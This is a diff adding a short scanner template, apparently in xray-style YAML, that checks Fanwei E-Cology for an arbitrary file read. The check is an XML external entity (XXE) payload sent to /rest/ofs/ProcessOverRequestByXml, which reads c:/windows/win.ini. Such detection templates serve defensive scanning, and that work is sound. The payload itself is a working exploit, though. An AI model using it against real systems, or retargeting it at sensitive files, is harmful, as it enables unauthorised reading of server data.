@@ -1,0 +1,15 @@
+name: fanwei-cology-fileread
+rules:
+  - method: POST
+    path: "/rest/ofs/ProcessOverRequestByXml"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="utf-8" ?><!DOCTYPE test[<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><reset><syscode>&test;</syscode></reset>
+    expression: |
+      response.status == 200 && (response.body.bcontains(b"[extensions]") || response.body.bcontains(b"[fonts]"))
+detail:
+  author: lxy
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  description: "泛微E-Cology 任意文件读取漏洞"
